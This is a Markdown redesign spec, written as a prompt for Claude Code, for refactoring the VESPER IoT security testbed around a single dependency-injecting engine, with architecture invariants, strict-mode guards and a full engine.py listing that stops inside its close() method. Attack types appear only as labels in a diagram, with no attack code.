# VESPER Architecture Redesign — Master Prompt

> **Purpose**: This document is a complete, actionable specification for restructuring the VESPER codebase. Feed it to Claude Code to implement the redesign.  
> **Date**: 2026-03-06  
> **Target**: MobiCom 2026 paper — WiFi-Faithful IoT Security Testbed

---

## 0. Instructions for Claude Code

**Read this entire document, then implement the redesign phase by phase (Section 8).**

### Environment

| Key | Value |
|-----|-------|
| Project root | `/Users/huanbui/Desktop/vesper/` |
| Python interpreter | `/Users/huanbui/Desktop/vesper/.venv/bin/python` (Python 3.13, venv) |
| Package | `vesper` — installed editable (`pip install -e .`) |
| OS | macOS 14, Apple M2 Pro |
| Docker | Docker Desktop for Mac (containers: vesper-homeassistant, vesper-matter-server, vesper-matter-bridge) |

### Workflow

1. Read this entire document before making any changes.
2. Implement **one phase at a time** from Section 8.
3. After each phase, run the verification command shown.
4. Use `/Users/huanbui/Desktop/vesper/.venv/bin/python` for all verification commands.
5. **Read the current file content** before editing any file — do not assume contents.
6. For **CREATE** files: use the full implementation code provided in Section 3.
7. For **MODIFY** files: follow the exact before→after instructions in Section 3.
8. For **DELETE** files: use `rm` commands.

### Key Rules

- All file paths are relative to project root (`/Users/huanbui/Desktop/vesper/`).
- Do NOT add new external dependencies beyond what's in `requirements.txt`.
- Maintain backward compatibility via aliases (e.g., `Simulation = VesperEngine`).
- When the spec says "accept injected X", add it as a constructor parameter with `None` default.
- If an injected dependency is `None`, fall back to local creation **only in compatibility mode (`strict=False`)**. In strict mode, shared objects must be injected by `VesperEngine`.
- Every `EventBus`, `DeviceRegistry`, and `MatterBridgeClient` instance must trace back to `VesperEngine` — no independent creation.
- **Strict mode is the default**. All evaluation runs, benchmarks, and paper-result-generating code MUST use `strict=True`. Compatibility mode (`strict=False`) is only for incremental development.
- **Verify invariants after every phase** — run the grep commands in Section 2.1a after each implementation phase. If any invariant is violated, fix it before proceeding to the next phase.
- **Use exact API contracts** from Section 7A when writing code that talks to the matter.js bridge, Home Assistant, or python-matter-server. Do NOT invent endpoints.

---

## Table of Contents

0. [Instructions for Claude Code](#0-instructions-for-claude-code)
1. [Current Architecture & Problems](#1-current-architecture--problems)
2. [New Architecture Overview](#2-new-architecture-overview)
   - 2.1a [Architecture Invariants](#21a-architecture-invariants-hard-rules--never-violated)
   - 2.5 [Execution Modes: Strict vs Compatibility](#25-execution-modes-strict-vs-compatibility)
3. [Module Specifications](#3-module-specifications)
   - 3.2.1 [EventBus Delivery Semantics](#321-eventbus-delivery-semantics-verified-from-source)
   - 3.4.1 [State Ownership & Consistency Model](#341-state-ownership--consistency-model)
   - 3.10.0 [VesperIntegration Scope Freeze](#3100-scope-freeze-what-vesperintegration-is-and-is-not)
4. [Data Flow Diagrams](#4-data-flow-diagrams)
5. [File-Level Change Plan](#5-file-level-change-plan)
6. [Docker / External Services](#6-docker--external-services)
7. [Config Schema](#7-config-schema)
7A. [Verified External API Contracts](#7a-verified-external-api-contracts)
8. [Implementation Order](#8-implementation-order)
9. [Constraints & Non-Goals](#9-constraints--non-goals)
10. [Evaluation Pipeline](#10-evaluation-pipeline)

Appendices: [A: File Inventory](#appendix-a-full-file-inventory-current) | [B: Open-Source Tools](#appendix-b-open-source-tools-used) | [C: Key Ports](#appendix-c-key-ports)

---

## 1. Current Architecture & Problems

### 1.1 Current Diagram

```
┌──────────────────────────────────────────────────────────────────────┐
│  __main__.py ─┬─► run_simulation() → Simulation (simulation.py)     │
│               ├─► run_platform()   → VesperPlatform (platform.py)   │
│               └─► run_demo()       → Simulation (simulation.py)     │
└──────────────────────────────────────────────────────────────────────┘
        │                                    │
        ▼                                    ▼
  ┌─ Simulation ─────┐            ┌─ VesperPlatform ──────┐
  │  EventBus #1      │            │  EventBus #2           │
  │  Environment      │            │  HubManager            │
  │  AgentController  │            │  MatterAdapter         │
  │  HabitatSimulator │            │  DashboardServer       │
  │  MatterBridge?    │            └────────────────────────┘
  └───────────────────┘
        │                     ┌─ VesperIntegration ──────────┐
        ▼                     │  EventBus #3 (!)              │
  ┌─ vesper_integration.py ─┐ │  IoTDeviceManager             │
  │  822-line god class     │ │  IoTBridge                    │
  │  IoT + Humanoid + LLM  │ │  HumanoidController           │
  │  TAP + Matter + WiFi   │ │  LLMClient                    │
  └─────────────────────────┘ │  TAPRuleEngine                │
                              │  MatterBridgeClient (dup #1)  │
                              │  WiFiEmulator (optional)      │
                              └───────────────────────────────┘
        │
        ▼
  ┌─ WiFiEmulator ──────────────────────────────────────────────┐
  │  route_to_bridge() → HTTP PUT to matter.js bridge           │
  │  TrafficTracker (WiFi-layer TrafficRecord)                  │
  └─────────────────────────────────────────────────────────────┘
        │
        ▼
  ┌─ VirtualHub ────────────────────────────────────────────────┐
  │  NEVER CALLED by the main simulation path (!)               │
  │  Has its own MatterBridgeClient (dup #2)                    │
  │  Has its own TrafficRecord (name collision)                 │
  │  Has its own device registry (diverges from Environment's)  │
  └─────────────────────────────────────────────────────────────┘
```

### 1.2 Problems Found (prioritised)

| # | Severity | Problem | Impact |
|---|----------|---------|--------|
| P1 | 🔴 Critical | `simulation.py` file and `simulation/` package coexist — requires fragile `importlib` hack in `simulation/__init__.py` | Breaks under refactoring, packaging |
| P2 | 🔴 Critical | **3+ separate EventBus instances** — Simulation, VesperIntegration, Environment each create their own | Events silently dropped across boundaries |
| P3 | 🔴 Critical | **MatterBridgeClient instantiated in 4+ places** independently (VesperIntegration, Simulation, VirtualHub, Platform) | No coordination, hardcoded URLs, wasted connections |
| P4 | 🔴 Critical | **Hub layer completely bypassed** — simulation path calls WiFiEmulator/MatterBridge directly | Hub's traffic logging, routing, and inspection never see main simulation traffic |
| P5 | 🟠 Major | **4 separate device registries** — Environment._devices, VirtualHub._devices, integrations/device_registry (SQLite), IoTDeviceManager | State diverges silently |
| P6 | 🟠 Major | **Config missing NetworkConfig + FirmwareConfig** — YAML sections `network:` and `firmware:` silently dropped by Pydantic | Config values unreachable at runtime |
| P7 | 🟠 Major | **`VesperIntegration` = 822-line god class** — IoT, humanoid, LLM, TAP, Matter, WiFi in one file | Untestable, impossible to reuse pieces |
| P8 | 🟠 Major | **`network_attacks.py` MatterAttackSuite uses fake broker protocol** (invented SUB/PUB over TCP) | Attacks would never succeed against actual REST API architecture |
| P9 | 🟡 Minor | **Two different `TrafficRecord` dataclasses** — `network.wifi_emulator.TrafficRecord` vs `hub.base.TrafficRecord` | Name collision, import confusion |
| P10 | 🟡 Minor | **Dead code**: `protocol/` module (never imported), `network/transport.py`, `network/router.py`, `network/broker.py`, MQTT aliases in wifi_emulator | Bloat, confusion |
| P11 | 🟡 Minor | `docker/Dockerfile.router` still installs `mosquitto` + `paho-mqtt` | Leftover from MQTT era |

---

## 2. New Architecture Overview

### 2.1 Design Principles

1. **Single-owner dependency injection**: One `VesperEngine` creates all shared objects and passes them down
2. **One EventBus**: Created once in `VesperEngine`, shared by every component
3. **One DeviceRegistry**: Canonical source of truth — every layer reads/writes the same registry
4. **All traffic through Hub**: WiFiEmulator → Hub → MatterBridge. Hub sees everything.
5. **No file/package name collisions**: Rename `simulation.py` → `engine.py`
6. **Config covers all YAML sections**: `NetworkConfig`, `FirmwareConfig` added to Pydantic root model

### 2.1a Architecture Invariants (HARD RULES — never violated)

These invariants are **non-negotiable**. Claude Code MUST verify each one holds after every phase. If any invariant is broken, stop and fix it before proceeding.

| # | Invariant | Enforcement |
|---|-----------|-------------|
| INV-1 | **Exactly ONE `EventBus` instance** exists per process. Every component receives it via constructor injection from `VesperEngine`. No component may call `EventBus()` directly. | `VesperEngine.__init__` creates it. Grep for `EventBus(` — must appear only in `engine.py` and test files. |
| INV-2 | **Exactly ONE `DeviceRegistry` instance** exists per process. All device state reads/writes go through this registry. `Environment._devices` holds IoTDevice objects for `.update(dt)` calls only — it is NOT the source of truth for state. | `VesperEngine.__init__` creates it. Grep for `DeviceRegistry(` — must appear only in `engine.py` and test files. |
| INV-3 | **Exactly ONE `MatterBridgeClient` instance** exists per process (when Matter is enabled). Created in `VesperEngine._setup_matter()`, injected into Hub and WiFiFirmwareBridge. No component may call `MatterBridgeClient()` directly. | Grep for `MatterBridgeClient(` — must appear only in `engine.py`, `_setup_matter()`, and test files. |
| INV-4 | **All device-to-bridge traffic routes through VirtualHub**. No component may call `WiFiEmulator.route_to_bridge()` or `MatterBridgeClient.update_state_sync()` directly — they must call `Hub.set_device_state()` or `Hub.send_command()`. The only exception is `VirtualHub` itself (which calls WiFiEmulator internally). | Grep for `route_to_bridge(` and `update_state_sync(` — must appear only inside `VirtualHub` methods and test files. |
| INV-5 | **No file/package name collision**. The old `simulation.py` file is deleted. The `simulation/` package uses a clean alias (`from vesper.engine import VesperEngine as Simulation`). No `importlib` hack exists. | `ls vesper/simulation.py` must fail. Grep for `importlib.util` in `simulation/__init__.py` — must not exist. |

**Verification command** (run after every phase):

```bash
# INV-1: One EventBus constructor
grep -rn "EventBus(" vesper/ --include="*.py" | grep -v test | grep -v "__pycache__" | grep -v "# type" | grep -v "import"

# INV-2: One DeviceRegistry constructor
grep -rn "DeviceRegistry(" vesper/ --include="*.py" | grep -v test | grep -v "__pycache__" | grep -v "import"

# INV-3: One MatterBridgeClient constructor
grep -rn "MatterBridgeClient(" vesper/ --include="*.py" | grep -v test | grep -v "__pycache__" | grep -v "import"

# INV-4: No direct route_to_bridge outside Hub
grep -rn "route_to_bridge(" vesper/ --include="*.py" | grep -v test | grep -v virtual_hub

# INV-5: No simulation.py, no importlib hack
test ! -f vesper/simulation.py && echo "OK: no simulation.py"
grep -c "importlib.util" vesper/simulation/__init__.py  # must be 0
```

### 2.2 New Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           vesper/engine.py                                  │
│                         class VesperEngine                                  │
│  ┌──────────────────────────────────────────────────────────────────────┐   │
│  │  OWNS (creates once, injects everywhere):                           │   │
│  │   • Config            — parsed from YAML (all sections)             │   │
│  │   • EventBus          — ONE instance, pub/sub backbone              │   │
│  │   • DeviceRegistry    — ONE canonical device store                  │   │
│  │   • WiFiNetwork       — WiFiEmulator (Mininet-WiFi / sim fallback) │   │
│  │   • Hub               — VirtualHub (routes ALL traffic)             │   │
│  │   • MatterBridge      — MatterBridgeClient (created ONCE)          │   │
│  │   • Habitat3D         — HabitatSimulator + sensor bridge            │   │
│  │   • AgentController   — LLM-powered humanoid agents                 │   │
│  │   • AttackSurface     — WiFi/network/firmware/phantom attacks       │   │
│  │   • Evaluator         — metrics, latency profiler, security eval    │   │
│  │   • Dashboard         — web UI (optional)                           │   │
│  └──────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  engine.initialize() → wire all components                                  │
│  engine.step(dt)      → one simulation tick                                 │
│  engine.run(duration)  → main loop                                          │
│  engine.close()       → teardown                                            │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 2.3 Layer Diagram (data flows top → bottom)

```
╔═══════════════════════════════════════════════════════════════════════════════╗
║  LAYER 1 — 3D SIMULATION                                                    ║
║  ┌───────────────┐  ┌───────────────┐  ┌────────────────┐                   ║
║  │ HabitatSim    │  │ AgentController│  │ SensorBridge   │                   ║
║  │ (3D world,    │  │ (LLM agents,  │  │ (3D raycasts → │                   ║
║  │  physics,     │  │  humanoid nav,│  │  sensor events)│                   ║
║  │  rendering)   │  │  task system) │  │                │                   ║
║  └───────┬───────┘  └───────┬───────┘  └───────┬────────┘                   ║
║          │                  │                   │                            ║
║          └──────────────────┴───────────────────┘                            ║
║                             │ EventBus                                       ║
╠═════════════════════════════╪═════════════════════════════════════════════════╣
║  LAYER 2 — EVENT BUS + DEVICE REGISTRY (shared backbone)                    ║
║                             │                                                ║
║           ┌─────────────────┼──────────────────┐                             ║
║           │            EventBus                │                             ║
║           │  (single instance, priority queue,  │                             ║
║           │   wildcard subscriptions, logging)  │                             ║
║           └─────────────────┼──────────────────┘                             ║
║                             │                                                ║
║           ┌─────────────────┼──────────────────┐                             ║
║           │         DeviceRegistry             │                             ║
║           │  (single instance, thread-safe,     │                             ║
║           │   state-change callbacks)           │                             ║
║           └─────────────────┼──────────────────┘                             ║
║                             │                                                ║
╠═════════════════════════════╪═════════════════════════════════════════════════╣
║  LAYER 3 — HUB (central traffic routing)                                    ║
║                             │                                                ║
║  ┌──────────────────────────┴───────────────────────────────┐                ║
║  │                     VirtualHub                           │                ║
║  │  • Receives ALL device state changes from DeviceRegistry │                ║
║  │  • Routes to MatterBridge via WiFiNetwork                │                ║
║  │  • Routes to Home Assistant via WebSocket                │                ║
║  │  • Routes to SmartThings via Schema Connector            │                ║
║  │  • Logs every packet as HubTrafficRecord                 │                ║
║  │  • Exposes send_command() / set_device_state() API       │                ║
║  └──────────────────────────┬───────────────────────────────┘                ║
║                             │                                                ║
╠═════════════════════════════╪═════════════════════════════════════════════════╣
║  LAYER 4 — NETWORK (emulated WiFi)                                          ║
║                             │                                                ║
║  ┌──────────────────────────┴───────────────────────────────┐                ║
║  │                   WiFiNetwork                            │                ║
║  │  (wraps WiFiEmulator)                                    │                ║
║  │  • Docker mode: curl inside Mininet-WiFi namespace       │                ║
║  │    → 802.11 frames → hostapd/AP → socat → bridge        │                ║
║  │  • Sim mode: simulated latency/jitter/loss → direct HTTP │                ║
║  │  • TrafficTracker: logs WiFiTrafficRecord per packet     │                ║
║  │  • tshark capture on ap1-wlan1 → pcap files              │                ║
║  └──────────────────────────┬───────────────────────────────┘                ║
║                             │                                                ║
╠═════════════════════════════╪═════════════════════════════════════════════════╣
║  LAYER 5 — MATTER BRIDGE + HOME ASSISTANT                                   ║
║                             │                                                ║
║  ┌──────────────────────────┴───────────────────────────────┐                ║
║  │  MatterBridgeClient ──REST──► matter.js bridge (:8484)   │                ║
║  │                               │                          │                ║
║  │                          Matter fabric (:5540)           │                ║
║  │                               │                          │                ║
║  │                    python-matter-server (:5580)           │                ║
║  │                               │                          │                ║
║  │                      Home Assistant (:8123)               │                ║
║  │                               │                          │                ║
║  │                    SmartThings (cloud, optional)          │                ║
║  └──────────────────────────────────────────────────────────┘                ║
║                                                                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  LAYER 6 — SECURITY EVALUATION                                              ║
║                                                                              ║
║  ┌───────────────┐  ┌───────────────┐  ┌────────────────┐  ┌────────────┐   ║
║  │WiFiAttacks    │  │NetworkAttacks │  │PhantomDelay    │  │FirmwareAtk │   ║
║  │(deauth, evil  │  │(REST injection│  │(TCP proxy,     │  │(buffer ovf,│   ║
║  │ twin, ARP     │  │ MITM on 8484,│  │ delay/drop/    │  │ stack smash│   ║
║  │ spoof, DNS)   │  │ replay)      │  │ reorder)       │  │ on ESP32)  │   ║
║  └───────┬───────┘  └───────┬───────┘  └───────┬────────┘  └─────┬──────┘   ║
║          │                  │                   │                 │           ║
║          └──────────────────┴───────────────────┴─────────────────┘           ║
║                             │                                                ║
║  ┌──────────────────────────┴───────────────────────────────┐                ║
║  │               Evaluator / MetricsCollector               │                ║
║  │  • Latency profiler (end-to-end sensor → HA)             │                ║
║  │  • Scalability benchmark (1–50 devices)                  │                ║
║  │  • Security eval (attack success rate, disruption %)     │                ║
║  │  • Report generator (LaTeX tables, plots)                │                ║
║  └──────────────────────────────────────────────────────────┘                ║
║                                                                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  LAYER 7 — FIRMWARE (ESP32 QEMU)                                            ║
║                                                                              ║
║  ┌───────────────────────────────────────────────────────────┐               ║
║  │  ESP32Runner (QEMU) × 8 devices                          │               ║
║  │  • Sensor templates (motion, temp, humidity, door, light) │               ║
║  │  • FreeRTOS task loop → serial TCP → host Python          │               ║
║  │  • SmartThings Device SDK integration                     │               ║
║  └───────────────────────────────────────────────────────────┘               ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

### 2.4 Dependency Injection Flow

```
VesperEngine.__init__(config)
│
├── self.event_bus    = EventBus(config.event_bus)           # ONE instance
├── self.registry     = DeviceRegistry(event_bus)            # ONE instance
├── self.matter_bridge= MatterBridgeClient(config.hub)      # ONE instance
├── self.wifi_network = WiFiEmulator(config.network, registry)
├── self.hub          = VirtualHub(config.hub, event_bus, registry, wifi_network, matter_bridge)
├── self.simulator    = HabitatSimulator(config, event_bus)
├── self.agents       = AgentController(event_bus)
├── self.attacks      = AttackSurface(wifi_network, hub, matter_bridge)
├── self.evaluator    = Evaluator(event_bus, registry, hub)
└── self.dashboard    = DashboardServer(config.dashboard, event_bus, registry, hub)
```

### 2.5 Execution Modes: Strict vs Compatibility

VESPER supports two execution modes. **Strict mode is the default for evaluation runs and paper results. Compatibility mode exists only for incremental development.**

| Property | Strict Mode (`strict=True`) | Compatibility Mode (`strict=False`) |
|----------|-----------------------------|--------------------------------------|
| Default? | **Yes** — all evaluation, benchmarks, paper runs | No — only for incremental dev/debug |
| Hub required when Matter enabled? | **Yes** — `initialize(matter=True)` forces `hub=True`. If Hub setup fails, `initialize()` raises `RuntimeError`. | No — Matter without Hub is allowed (traffic bypasses Hub, no logging) |
| EventBus singleton? | **Enforced** — `VesperEngine` sets a module-level `_STRICT_MODE = True` flag; `EventBus.__init__` checks it and raises `RuntimeError` on second instantiation (see implementation note below) | Warned — logs `WARNING: additional EventBus instance created` |
| DeviceRegistry singleton? | **Enforced** — same guard pattern as EventBus | Warned |
| MatterBridgeClient singleton? | **Enforced** — same guard pattern | Warned |
| Direct `route_to_bridge()` calls? | **Blocked** — `WiFiEmulator.route_to_bridge()` checks caller is VirtualHub (or raises) | Allowed with warning |
| Missing config sections? | **Error when loading YAML in strict mode** — `load_config()` validates that top-level `network:` and `firmware:` sections are explicitly present in the YAML file before constructing `Config`. `Config()` may still use `default_factory` for programmatic construction/tests. | Defaults used silently |
| Invariant verification | **Automatic** — `engine.initialize()` calls `_verify_invariants()` at end | Skipped |

**How to set mode:**

```yaml
# configs/default.yaml
simulation:
  strict_mode: true   # default

# Or in code:
engine = VesperEngine(config_path="configs/default.yaml")
engine.initialize(strict=True)  # explicit override
```

**Implementation**: Add `strict: bool = True` field to `SimulationConfig`. VesperEngine reads `self.config.simulation.strict_mode`. The `initialize()` method receives an optional `strict` override parameter.

**Strict config parsing rule**: Keep `default_factory` on `Config` fields so `Config()` still works for tests and programmatic construction. Enforce required YAML sections in `load_config(path)` instead:

```python
# In load_config(path):
import yaml

with open(path) as f:
    raw = yaml.safe_load(f) or {}

strict = raw.get("simulation", {}).get("strict_mode", True)
if strict:
    missing = [key for key in ("network", "firmware") if key not in raw]
    if missing:
        raise ValueError(
            f"STRICT MODE: missing required YAML sections: {', '.join(missing)}"
        )

return Config(**raw)
```

**Singleton guard implementation** (required change to `event_bus.py`, `registry.py`, `bridge_client.py`):

Despite Section 3.2 marking `event_bus.py` as "KEEP, no changes" for its core logic, the following **minimal addition** is required at module scope in each singleton class's file:

```python
# Add at module scope in event_bus.py, registry.py, bridge_client.py:
_INSTANCE_COUNT = 0
_STRICT_MODE = False  # Set to True by VesperEngine when strict=True

class EventBus:  # (or DeviceRegistry, or MatterBridgeClient)
    def __init__(self, ...):
        global _INSTANCE_COUNT
        _INSTANCE_COUNT += 1
        if _STRICT_MODE and _INSTANCE_COUNT > 1:
            raise RuntimeError(
                f"STRICT MODE: {self.__class__.__name__} instantiated "
                f"{_INSTANCE_COUNT} times. Only VesperEngine may create this object."
            )
        elif _INSTANCE_COUNT > 1:
            logger.warning("%s instantiated %d times", self.__class__.__name__, _INSTANCE_COUNT)
        # ... rest of __init__ unchanged ...
```

`VesperEngine.__init__` sets the flag before creating singletons:
```python
# In VesperEngine.__init__, before creating shared objects:
import vesper.core.event_bus as _eb_mod
import vesper.core.registry as _reg_mod
_eb_mod._STRICT_MODE = self.config.simulation.strict_mode
_reg_mod._STRICT_MODE = self.config.simulation.strict_mode
```

This is NOT a rewrite of EventBus — it is a 6-line addition at module scope and 4 lines in `__init__`. The core EventBus logic (PriorityQueue, dispatch, subscriptions) is unchanged.

---

## 3. Module Specifications

### 3.1 `vesper/engine.py` — VesperEngine (NEW — replaces `simulation.py`)

**Purpose**: Single top-level orchestrator. Creates all shared objects, runs the main loop.

**Replaces**: `vesper/simulation.py` (223 lines). The old file is **deleted**.

**Tools/Dependencies**: `vesper.config`, `vesper.core.event_bus`, `vesper.core.registry`, `vesper.habitat.simulator`, `vesper.agents.controller`, `vesper.network.wifi_emulator`, `vesper.hub.virtual_hub`, `vesper.matter.bridge_client`

**Full implementation** — copy this file verbatim to `vesper/engine.py`:

```python
"""
VESPER Engine — Top-level simulation orchestrator.

Replaces the old ``simulation.py`` (which collided with the
``simulation/`` package).  VesperEngine creates all shared objects
once and injects them into every component via constructor arguments.

Design principles:
    1. ONE EventBus — created here, passed to everything
    2. ONE DeviceRegistry — canonical device store
    3. ONE MatterBridgeClient — created here, shared
    4. All traffic through Hub → WiFi → Matter bridge
    5. No component creates its own copies of shared resources

Usage:
    from vesper.engine import VesperEngine

    with VesperEngine(config_path="configs/default.yaml") as engine:
        engine.run(duration=60)
"""

from __future__ import annotations

import logging
import time
from dataclasses import dataclass, field
from typing import Any, Dict, Optional

from vesper.config import Config, load_config
from vesper.core.event_bus import EventBus
from vesper.core.registry import DeviceRegistry
from vesper.core.environment import Environment
from vesper.agents.controller import AgentController
from vesper.habitat.simulator import create_simulator, SimulatorConfig

logger = logging.getLogger(__name__)


@dataclass
class EngineStats:
    """Runtime statistics for VesperEngine."""
    ticks: int = 0
    elapsed_time: float = 0.0
    avg_tick_time: float = 0.0
    firmware_events: int = 0
    matter_updates: int = 0


class VesperEngine:
    """
    Top-level simulation orchestrator.

    Owns all shared objects (EventBus, DeviceRegistry, Hub, WiFiNetwork,
    MatterBridge, etc.) and passes them to components via constructor
    injection.  This eliminates the 3+ EventBus / 4+ registry / 4+
    MatterBridgeClient duplication that plagued the old architecture.
    """

    def __init__(
        self,
        config: Optional[Config] = None,
        config_path: Optional[str] = None,
    ):
        # ── Config ────────────────────────────────────────────────
        if config_path:
            self.config = load_config(config_path)
        else:
            self.config = config or Config()

        # ── Strict-mode singleton guards ─────────────────────────
        import vesper.core.event_bus as _eb_mod
        import vesper.core.registry as _reg_mod
        import vesper.matter.bridge_client as _mb_mod

        _strict = self.config.simulation.strict_mode
        _eb_mod._STRICT_MODE = _strict
        _reg_mod._STRICT_MODE = _strict
        _mb_mod._STRICT_MODE = _strict

        # ── Shared singletons (created here, injected everywhere) ─
        self.event_bus = EventBus(
            max_queue_size=self.config.event_bus.max_queue_size,
            enable_logging=self.config.event_bus.logging,
            log_file=self.config.event_bus.log_file,
        )
        self.registry = DeviceRegistry(event_bus=self.event_bus)
        self.environment = Environment(
            config=self.config,
            event_bus=self.event_bus,
            registry=self.registry,          # ← INV-2: share canonical registry
        )
        self.agent_controller = AgentController(event_bus=self.event_bus)

        # ── Lazy-initialised subsystems ───────────────────────────
        self.matter_bridge = None     # MatterBridgeClient
        self.wifi_network = None      # WiFiEmulator
        self.hub = None               # VirtualHub
        self.simulator = None         # HabitatSimulator
        self._wifi_bridge = None      # MatterFirmwareBridge

        # ── Runtime state ─────────────────────────────────────────
        self._running = False
        self._stats = EngineStats()

    # ── Properties ────────────────────────────────────────────────

    @property
    def is_running(self) -> bool:
        return self._running

    @property
    def stats(self) -> EngineStats:
        return self._stats

    # ── Initialisation ────────────────────────────────────────────

    def initialize(
        self,
        use_mock_sim: bool = True,
        matter: bool = False,
        wifi: bool = False,
        hub: bool = False,
        strict: Optional[bool] = None,
    ) -> bool:
        """
        Wire all components.

        Order matters:
        1. EventBus + DeviceRegistry (already created in __init__)
        2. MatterBridgeClient  (if matter=True)
        3. WiFiNetwork         (if wifi=True)
        4. Hub                 (if hub=True or matter=True — MANDATORY when matter=True)
        5. HabitatSimulator + devices
        6. AgentController (already created)
        7. Verify invariants (strict mode)

        In strict mode (default):
        - matter=True forces hub=True (INV-4: all traffic through Hub)
        - If Hub setup fails when matter=True, raise RuntimeError
        - _verify_invariants() called at end
        """
        _strict = strict if strict is not None else self.config.simulation.strict_mode
        logger.info("Initializing VesperEngine (strict=%s)...", _strict)

        # 1. Backbone already ready (event_bus, registry)

        # 2. Matter bridge
        if matter:
            self._setup_matter()

        # 3. WiFi network
        if wifi:
            self._setup_wifi()

        # 4. Hub (MANDATORY when matter=True in strict mode)
        if matter and _strict:
            hub = True  # INV-4: enforce hub routing
        if hub or matter:
            self._setup_hub()
            if self.hub is None and matter and _strict:
                raise RuntimeError(
                    "STRICT MODE: Hub setup failed but matter=True. "
                    "All Matter traffic MUST route through Hub (INV-4). "
                    "Fix Hub configuration or use strict=False for debugging."
                )

        # 5. Habitat simulator + devices
        sim_config = SimulatorConfig(
            scene_path=self.config.environment.scene,
            render_mode="headless" if self.config.simulation.headless else "window",
        )
        self.simulator = create_simulator(sim_config, use_mock=use_mock_sim)
        self.simulator.initialize()

        self._setup_devices()

        logger.info(
            "VesperEngine initialized — %d devices, "
            "matter=%s, wifi=%s, hub=%s",
            self.registry.count,
            self.matter_bridge is not None,
            self.wifi_network is not None,
            self.hub is not None,
        )

        # 7. Verify architecture invariants (strict mode)
        if _strict:
            self._verify_invariants()

        return True

    # ── Invariant verification ────────────────────────────────────

    def _verify_invariants(self) -> None:
        """
        Runtime check of architecture invariants (INV-1 through INV-5).
        Called at end of initialize() in strict mode.
        Raises RuntimeError on any violation.
        """
        errors = []

        # INV-1: One EventBus
        if not isinstance(self.event_bus, EventBus):
            errors.append("INV-1: event_bus is not an EventBus instance")

        # INV-2: One DeviceRegistry — check Environment uses same registry
        if self.environment._registry is not None and self.environment._registry is not self.registry:
            errors.append("INV-2: Environment._registry is not the same as engine.registry")

        # INV-2b: Environment↔Registry consistency
        for device_id in self.environment._devices:
            if device_id not in self.registry:
                errors.append(
                    f"INV-2: device {device_id} exists in Environment but not in DeviceRegistry"
                )

        # INV-3: One MatterBridgeClient (if Matter enabled)
        if self.matter_bridge is not None and self.hub is not None:
            if hasattr(self.hub, '_matter_bridge') and self.hub._matter_bridge is not self.matter_bridge:
                errors.append("INV-3: Hub._matter_bridge is not the same as engine.matter_bridge")

        # INV-4: Hub exists when Matter is enabled
        if self.matter_bridge is not None and self.hub is None:
            errors.append("INV-4: Matter enabled but Hub is None — traffic cannot route through Hub")

        if errors:
            msg = "STRICT MODE invariant violations:\n" + "\n".join(f"  • {e}" for e in errors)
            raise RuntimeError(msg)

        logger.info("✓ All architecture invariants verified")

    # ── Setup helpers ─────────────────────────────────────────────

    def _setup_matter(self) -> None:
        """Create the ONE MatterBridgeClient instance."""
        try:
            from vesper.matter.bridge_client import MatterBridgeClient

            url = self.config.hub.matter_bridge_url
            self.matter_bridge = MatterBridgeClient(base_url=url)
            if self.matter_bridge.wait_ready_sync(max_wait=30):
                logger.info("Matter bridge connected at %s", url)
            else:
                logger.warning("Matter bridge not reachable at %s", url)
                self.matter_bridge = None
        except ImportError:
            logger.warning("Matter bridge client not available (missing dep)")
        except Exception as e:
            logger.error("Matter bridge setup failed: %s", e)
            self.matter_bridge = None

    def _setup_wifi(self) -> None:
        """Create the WiFiEmulator (shared, with registry)."""
        try:
            from vesper.network.wifi_emulator import WiFiEmulator

            self.wifi_network = WiFiEmulator(registry=self.registry)
            logger.info("WiFi emulator ready (sim mode)")
        except Exception as e:
            logger.error("WiFi emulator setup failed: %s", e)
            self.wifi_network = None

    def _setup_hub(self) -> None:
        """Create the VirtualHub with injected deps."""
        try:
            from vesper.hub.virtual_hub import VirtualHub

            self.hub = VirtualHub(
                hub_id="vesper-virtual-hub",
                name="VESPER Virtual Hub",
                event_bus=self.event_bus,
                registry=self.registry,
                wifi_network=self.wifi_network,
                matter_bridge=self.matter_bridge,
                ha_url=self.config.hub.ha_url,
                ha_token=self.config.hub.ha_token,
            )
            logger.info("VirtualHub created with injected deps")
        except Exception as e:
            logger.error("Hub setup failed: %s", e)
            self.hub = None

    def _setup_devices(self) -> None:
        """Register IoT devices from configuration into the shared registry."""
        from vesper.devices import MotionSensor, ContactSensor, SmartDoor, LightSensor
        from vesper.core.registry import DeviceEntry

        device_configs = [
            ("motion_sensor", self.config.devices.motion_sensor, MotionSensor),
            ("contact_sensor", self.config.devices.contact_sensor, ContactSensor),
            ("smart_door", self.config.devices.smart_door, SmartDoor),
            ("light_sensor", self.config.devices.light_sensor, LightSensor),
        ]

        for name, dev_cfg, cls in device_configs:
            if dev_cfg.enabled:
                device = cls(event_bus=self.event_bus)
                # Register in Environment (for spatial queries / tick updates)
                self.environment.register_device(device)
                # Also register in the canonical DeviceRegistry
                self.registry.register_or_update(
                    device.device_id,
                    DeviceEntry(
                        device_id=device.device_id,
                        device_type=device.device_type,
                        name=name,
                    ),
                )
                logger.debug("Registered device: %s (%s)", name, device.device_id)

    # ── Main loop ─────────────────────────────────────────────────

    def step(self, dt: Optional[float] = None) -> None:
        """Execute one simulation tick."""
        dt = dt or (1.0 / self.config.simulation.tick_rate)
        start = time.time()

        # Simulator
        if self.simulator:
            self.simulator.step()

        # Environment devices
        self.environment.tick(dt)

        # Agents
        self.agent_controller.update(dt, self.environment)

        # Event processing
        self.event_bus.process_events()

        self._stats.ticks += 1
        tick_time = time.time() - start
        self._stats.elapsed_time += tick_time
        self._stats.avg_tick_time = self._stats.elapsed_time / self._stats.ticks

    def run(self, duration: float = 10.0) -> None:
        """Run the main loop for ``duration`` seconds."""
        logger.info("Running simulation for %.1fs...", duration)
        self._running = True
        dt = 1.0 / self.config.simulation.tick_rate
        end_time = time.time() + duration

        while self._running and time.time() < end_time:
            self.step(dt)
            time.sleep(max(0, dt - self._stats.avg_tick_time))

        self._running = False
        logger.info("Simulation complete: %d ticks", self._stats.ticks)

    def stop(self) -> None:
        """Signal the main loop to stop."""
        self._running = False

    # ── Teardown ──────────────────────────────────────────────────

    def close(self) -> None:
        """Tear down all components in reverse order."""
        self.stop()

        # Matter bridge is stateless REST — nothing to close
